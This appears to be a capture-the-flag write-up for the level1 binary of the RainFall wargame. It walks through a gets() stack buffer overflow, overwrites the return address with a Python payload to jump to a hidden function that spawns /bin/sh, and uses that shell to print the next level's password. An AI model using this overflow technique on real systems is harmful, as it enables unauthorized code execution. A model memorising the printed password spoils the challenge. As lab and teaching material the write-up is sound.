New binary, level1, we try to run it:
Hangs, waits for input and exits
disas main
```
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret

```
So we have 2 things:
	- gets is a vulnerable function as it will accept any amount of input and write over the limit of that buffer
	- 80 bytes (0x50) are allocated for puts
We test it more and see that there is a Illegal instruction error when we have 76 characters
```
level1@RainFall:~$ ./level1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Segmentation fault (core dumped)
level1@RainFall:~$ ./level1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    
Illegal instruction (core dumped)
level1@RainFall:~$ ./level1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    
```
That must be the point where we overflow our allocated buffer and we get to the address of ESP
We try objdump to see if there are more functions inside and we find 
```
08048444 <run>:
...
 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
 
 (gdb) x/s 0x8048584
0x8048584:       "/bin/sh"
```
So now we have to "jump" to the address of the run function so it can execute "/bin/sh" that is stored to a pointer at the begining of the function
```
level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/expl
level1@RainFall:~$ cat /tmp/expl | ./level1 
Good... Wait what?
Segmentation fault (core dumped)

```

Because /bin/sh is opened trough a pipe it will recive eof from stdin and close, so we need a way to keep the pipe listening to stdin

```
level1@RainFall:~$ cat /tmp/expl - | ./level1 
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

```